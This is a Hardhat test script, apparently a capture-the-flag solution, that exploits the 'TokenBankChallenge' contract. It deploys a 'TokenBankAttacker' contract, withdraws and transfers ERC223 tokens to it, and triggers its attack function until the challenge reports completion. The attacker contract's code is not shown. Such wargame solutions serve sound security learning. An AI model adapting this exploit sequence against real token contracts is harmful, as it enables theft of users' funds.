import {ethers} from "hardhat";
import {BigNumber, Contract, Signer} from "ethers";
import {expect} from "chai";


let accounts: Signer[];
let attacker: Signer;
let contract: Contract; // challenge contract
let token : Contract;
let withdrawValue = ethers.utils.parseEther('500000');

before(async function () {
    accounts = await ethers.getSigners();
    attacker = accounts[0];
    const challengeFactory = await ethers.getContractFactory("TokenBankChallenge", attacker);
    contract = challengeFactory.attach(`0x1c9cF129Bf1853E45E11c7BbabEA032a055F3b1D`);
    const tokenFactory = await ethers.getContractFactory("SimpleERC223Token",attacker);
    const tokenAddress = await contract.token();
    token = tokenFactory.attach(tokenAddress);
});

it("solves the challenge", async function () {
    const attackerFactory = await ethers.getContractFactory("TokenBankAttacker", attacker);
    let attackerContract = await attackerFactory.deploy(contract.address,{gasLimit:1e6});
    let withdrawTx = await contract.withdraw(withdrawValue);
    console.log("withdraw transaction hash:",withdrawTx.hash);
    let transferTx = await token[`transfer(address,uint256,bytes)`](attackerContract.address,withdrawValue,[1],{gasLimit:1e6});
    console.log("transfer transaction hash:",transferTx.hash);
    let attackTx = await attackerContract.attack({gasLimit:1e6});
    console.log("attack transaction hash:",attackTx.hash);
});

after(async function () {
    expect(await contract.isComplete()).to.eq(true);
});